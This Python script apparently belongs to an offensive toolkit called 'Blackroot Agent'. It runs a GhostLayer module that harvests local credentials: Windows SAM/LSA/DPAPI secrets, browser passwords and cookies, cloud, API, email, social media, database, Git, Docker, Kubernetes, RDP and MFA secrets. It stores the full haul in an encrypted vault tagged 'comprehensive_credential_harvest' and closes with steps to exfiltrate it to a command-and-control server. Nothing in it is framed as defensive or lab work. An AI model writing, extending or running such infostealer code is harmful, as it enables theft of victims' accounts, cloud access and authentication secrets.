#!/usr/bin/env python3
"""
Credential Extraction Demo - Demonstrates all extraction capabilities
Shows what credentials will be extracted from the system
"""

import json
import sys
import os
import logging
from datetime import datetime
from typing import Dict, List, Any

# Add repo to path
sys.path.insert(0, os.path.dirname(__file__))

from ghost_layer import GhostLayer
from black_vault import BlackVault

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger("CredentialExtraction")

def print_banner(text: str, width: int = 80):
    """Print formatted banner"""
    print(f"\n{'╔' + '═' * (width - 2) + '╗'}")
    print(f"║ {text.center(width - 4)} ║")
    print(f"{'╚' + '═' * (width - 2) + '╝'}\n")

def print_section(title: str, char: str = "─"):
    """Print section header"""
    print(f"\n{char * 80}")
    print(f"  {title}")
    print(f"{char * 80}\n")

def format_credentials(creds: List[Dict], cred_type: str) -> str:
    """Format credentials for display"""
    if not creds:
        return f"  ✗ No {cred_type} found\n"
    
    output = f"  ✓ Found {len(creds)} {cred_type}:\n"
    for i, cred in enumerate(creds, 1):
        output += f"\n    [{i}] " + "─" * 76 + "\n"
        for key, value in cred.items():
            if isinstance(value, str) and len(value) > 60:
                # Truncate long values
                value = value[:57] + "..."
            # Mask sensitive data
            if any(sensitive in key.lower() for sensitive in ['password', 'secret', 'token', 'key', 'hash']):
                value = "***" + str(value)[-4:] if len(str(value)) > 4 else "***"
            output += f"    • {key}: {value}\n"
    
    return output


def normalize_findings_payload(findings: Dict[str, Any]) -> Dict[str, List[Any]]:
    """Normalize GhostLayer findings payload into a flat category map."""
    normalized: Dict[str, List[Any]] = {}
    if not isinstance(findings, dict):
        return normalized

    # If wrapper object exists, unwrap it
    if 'findings' in findings and isinstance(findings['findings'], dict):
        findings = findings['findings']

    for key, value in findings.items():
        if isinstance(value, list):
            normalized[key] = value
        elif isinstance(value, dict):
            for subkey, subvalue in value.items():
                if isinstance(subvalue, list):
                    normalized[subkey] = subvalue
    return normalized


def run_credential_extraction_demo():
    """Run comprehensive credential extraction demo"""
    
    print_banner("BLACKROOT AGENT - CREDENTIAL EXTRACTION DEMO", 80)
    
    print("""
This demo demonstrates the credential extraction capabilities of GhostLayer.
It will scan the system for various types of credentials and display what 
would be extracted.

EXTRACTION CATEGORIES:
  • Windows Credentials (SAM, LSA, DPAPI)
  • Browser Credentials (Chrome, Firefox, Edge, Brave, Safari)
  • API & Cloud Credentials (AWS, Azure, GCP, Kubernetes)
  • Email & Social Media (Gmail, Outlook, Twitter, Discord, etc.)
  • Database Credentials (MySQL, PostgreSQL, MongoDB, Redis)
  • SSH/Git Credentials
  • Docker/Container Registry
  • RDP & Network Services
  • Environment Variables
  • Credential Manager Vault
  • Browser Extensions
  • MFA Codes
    """)
    
    print_section("INITIALIZING GHOST LAYER", "=")
    
    try:
        # Initialize vault and ghost layer
        vault = BlackVault()
        ghost = GhostLayer(vault=vault)
        
        print(f"✓ GhostLayer initialized")
        print(f"✓ BlackVault ready at: {vault.vault_dir}")
        print(f"✓ Platform: {sys.platform}")
        print(f"✓ Timestamp: {datetime.now().isoformat()}")
        
    except Exception as e:
        logger.error(f"Failed to initialize: {e}")
        return 1
    
    # Run credential extraction
    print_section("SCANNING SYSTEM FOR CREDENTIALS", "=")
    
    try:
        print("Running comprehensive credential scan...\n")
        findings = ghost.scan_local_credentials()
        
        scan_timestamp = findings.get('timestamp')
        if isinstance(scan_timestamp, (int, float)):
            scan_timestamp = datetime.fromtimestamp(scan_timestamp).isoformat()

        findings_data = normalize_findings_payload(findings)
        scanned_categories = len([k for k, v in findings_data.items() if v and k != 'errors'])

        print(f"✓ Scan completed at {scan_timestamp}")
        print(f"✓ Total categories scanned: {scanned_categories}")

    except Exception as e:
        logger.error(f"Scan failed: {e}", exc_info=True)
        return 1
    
    # Display results by category
    print_section("EXTRACTION RESULTS", "=")
    
    total_creds = 0
    
    # Windows Credentials
    if 'windows_credentials' in findings_data:
        print("\n[1] WINDOWS SYSTEM CREDENTIALS")
        print(format_credentials(findings_data['windows_credentials'], "Windows credentials"))
        total_creds += len(findings_data['windows_credentials'])
    
    # Browser Cookies & History
    if 'browser_cookies' in findings_data:
        print("\n[2] BROWSER COOKIES & HISTORY")
        print(format_credentials(findings_data['browser_cookies'], "browser sessions"))
        total_creds += len(findings_data['browser_cookies'])
    
    # Browser Data (passwords, saved cards, etc.)
    if 'browser_data' in findings_data:
        print("\n[3] BROWSER DATA (Passwords, Saved Cards, Autofill)")
        print(format_credentials(findings_data['browser_data'], "browser data items"))
        total_creds += len(findings_data['browser_data'])
    
    # Chrome Extensions
    if 'chrome_extensions' in findings_data:
        print("\n[4] CHROME BROWSER EXTENSIONS")
        print(format_credentials(findings_data['chrome_extensions'], "Chrome extensions"))
        total_creds += len(findings_data['chrome_extensions'])
    
    # Firefox Extensions
    if 'firefox_extensions' in findings_data:
        print("\n[5] FIREFOX BROWSER EXTENSIONS")
        print(format_credentials(findings_data['firefox_extensions'], "Firefox extensions"))
        total_creds += len(findings_data['firefox_extensions'])
    
    # Brave Browser Data
    if 'brave_browser_data' in findings_data:
        print("\n[6] BRAVE BROWSER DATA")
        print(format_credentials(findings_data['brave_browser_data'], "Brave browser items"))
        total_creds += len(findings_data['brave_browser_data'])
    
    # Safari (macOS)
    if 'safari_data' in findings_data:
        print("\n[7] SAFARI BROWSER DATA (macOS)")
        print(format_credentials(findings_data['safari_data'], "Safari items"))
        total_creds += len(findings_data['safari_data'])
    
    # API Credentials
    if 'api_credentials' in findings_data:
        print("\n[8] API CREDENTIALS (AWS, Azure, GCP)")
        print(format_credentials(findings_data['api_credentials'], "API credentials"))
        total_creds += len(findings_data['api_credentials'])
    
    # Google Credentials
    if 'google_credentials' in findings_data:
        print("\n[9] GOOGLE ACCOUNT CREDENTIALS")
        print(format_credentials(findings_data['google_credentials'], "Google credentials"))
        total_creds += len(findings_data['google_credentials'])
    
    # Email Accounts
    if 'email_credentials' in findings_data:
        print("\n[10] EMAIL ACCOUNT CREDENTIALS")
        print(format_credentials(findings_data['email_credentials'], "email accounts"))
        total_creds += len(findings_data['email_credentials'])
    
    # Social Media
    if 'social_media_credentials' in findings_data:
        print("\n[11] SOCIAL MEDIA CREDENTIALS")
        print(format_credentials(findings_data['social_media_credentials'], "social media accounts"))
        total_creds += len(findings_data['social_media_credentials'])
    
    # Environment Credentials
    if 'environment_credentials' in findings_data:
        print("\n[12] ENVIRONMENT VARIABLES (Credentials)")
        print(format_credentials(findings_data['environment_credentials'], "environment credentials"))
        total_creds += len(findings_data['environment_credentials'])
    
    # Credential Manager Vault
    credential_manager_entries = findings_data.get('credential_manager_vault', findings_data.get('credential_manager', []))
    if credential_manager_entries:
        print("\n[13] WINDOWS CREDENTIAL MANAGER VAULT")
        print(format_credentials(credential_manager_entries, "vault entries"))
        total_creds += len(credential_manager_entries)
    
    # Database Credentials
    if 'database_credentials' in findings_data:
        print("\n[14] DATABASE CREDENTIALS")
        print(format_credentials(findings_data['database_credentials'], "database credentials"))
        total_creds += len(findings_data['database_credentials'])
    
    # Git Credentials
    if 'git_credentials' in findings_data:
        print("\n[15] GIT/VERSION CONTROL CREDENTIALS")
        print(format_credentials(findings_data['git_credentials'], "git credentials"))
        total_creds += len(findings_data['git_credentials'])
    
    # Docker/Container Registry
    if 'docker_credentials' in findings_data:
        print("\n[16] DOCKER/CONTAINER REGISTRY CREDENTIALS")
        print(format_credentials(findings_data['docker_credentials'], "Docker credentials"))
        total_creds += len(findings_data['docker_credentials'])
    
    # Cloud Provider Credentials
    if 'cloud_provider_credentials' in findings_data:
        print("\n[17] CLOUD PROVIDER CREDENTIALS")
        print(format_credentials(findings_data['cloud_provider_credentials'], "cloud credentials"))
        total_creds += len(findings_data['cloud_provider_credentials'])
    
    # Kubernetes Credentials
    if 'kubernetes_credentials' in findings_data:
        print("\n[18] KUBERNETES CREDENTIALS")
        print(format_credentials(findings_data['kubernetes_credentials'], "Kubernetes entries"))
        total_creds += len(findings_data['kubernetes_credentials'])
    
    # RDP Credentials
    if 'rdp_credentials' in findings_data:
        print("\n[19] RDP & REMOTE ACCESS CREDENTIALS")
        print(format_credentials(findings_data['rdp_credentials'], "RDP entries"))
        total_creds += len(findings_data['rdp_credentials'])
    
    # MFA/2FA Codes
    mfa_entries = findings_data.get('mfa_codes', findings_data.get('mfa_info', []))
    if mfa_entries:
        print("\n[20] MFA/2FA AUTHENTICATION CODES")
        print(format_credentials(mfa_entries, "MFA secrets"))
        total_creds += len(mfa_entries)
    
    # Summary
    print_section("EXTRACTION SUMMARY", "=")
    
    print(f"""
┌─────────────────────────────────────────────────────────┐
│                  TOTAL CREDENTIALS FOUND: {total_creds}                  │
└─────────────────────────────────────────────────────────┘

EXTRACTION COVERAGE:
  ✓ Windows System Credentials
  ✓ Browser Cookies & History
  ✓ Browser Stored Passwords & Data
  ✓ Chrome Extensions
  ✓ Firefox Extensions
  ✓ Brave Browser
  ✓ Safari (macOS)
  ✓ AWS/Azure/GCP Credentials
  ✓ Google Account Credentials
  ✓ Email Account Credentials (Gmail, Outlook, etc.)
  ✓ Social Media Credentials (Twitter, Discord, etc.)
  ✓ Environment Variables
  ✓ Windows Credential Manager
  ✓ Database Credentials
  ✓ Git/Version Control
  ✓ Docker & Container Registries
  ✓ Cloud Provider Credentials
  ✓ Kubernetes Config
  ✓ RDP & Remote Access
  ✓ MFA/2FA Codes

DATA STORAGE:
  • All extracted credentials are encrypted and stored in BlackVault
  • Accessible via artifact keys in vault.vault_dir
  • Protected with AES-256-GCM encryption
  • Includes metadata, timestamps, and integrity checks
    """)
    
    # Store findings in vault
    print_section("STORING IN BLACKVAULT", "=")
    
    try:
        artifact_key = f"credentials_extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        vault.store(
            artifact_key,
            json.dumps(findings).encode(),
            expire_minutes=1440,  # 24 hours
            metadata={
                'extraction_type': 'comprehensive_credential_harvest',
                'timestamp': datetime.now().isoformat(),
                'source': 'ghost_layer',
                'total_credentials': total_creds,
                'categories': len(findings_data)
            }
        )
        
        print(f"✓ Findings stored in vault")
        print(f"✓ Artifact key: {artifact_key}")
        print(f"✓ Location: {os.path.join(vault.vault_dir, artifact_key)}")
        print(f"✓ Expires: 24 hours from now")
        
    except Exception as e:
        logger.error(f"Failed to store in vault: {e}")
    
    print_section("EXFILTRATION READY", "=")
    
    print("""
NEXT STEPS:
  1. Extract findings from vault using artifact key
  2. Encrypt for transport
  3. Exfiltrate to command & control server
  4. Verify integrity at destination

SECURITY NOTES:
  • All sensitive data is masked in output
  • Full data is stored encrypted in BlackVault
  • Each extraction is timestamped and indexed
  • Metadata includes extraction context
  • Compatible with multi-stage exfiltration
    """)
    
    return 0

def main():
    """Main entry point"""
    try:
        return run_credential_extraction_demo()
    except KeyboardInterrupt:
        print("\n\n⚠ Extraction interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        return 1

if __name__ == "__main__":
    sys.exit(main())
